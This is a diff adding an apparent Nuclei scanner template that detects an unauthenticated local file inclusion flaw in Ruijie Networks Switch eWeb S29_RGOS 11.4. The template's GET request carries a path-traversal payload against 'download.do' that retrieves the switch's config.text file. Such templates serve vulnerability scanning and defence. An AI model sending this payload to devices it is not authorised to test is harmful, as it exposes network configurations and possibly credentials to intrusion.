@@ -1,0 +1,36 @@
+http:
+- matchers:
+  - part: header
+    type: word
+    words:
+    - filename="config.text"
+    - 'Content-Type: application/octet-stream'
+  - condition: and
+    part: body
+    type: word
+    words:
+    - version S29_RGOS 11.4
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/download.do?file=../../../../config.text'
+id: ruijie-networks-lfi
+info:
+  author: pikpikcu
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  description: Ruijie Networks Switch eWeb S29_RGOS 11.4 is vulnerable to local file
+    inclusion and allows remote unauthenticated attackers to access locally stored
+    files and retrieve their content via the 'download.do' endpoint.
+  metadata:
+    max-request: 1
+  name: Ruijie Networks Switch eWeb S29_RGOS 11.4 - Local File Inclusion
+  reference:
+  - https://exploit-db.com/exploits/48755
+  severity: high
+  tags: ruijie,lfi,edb
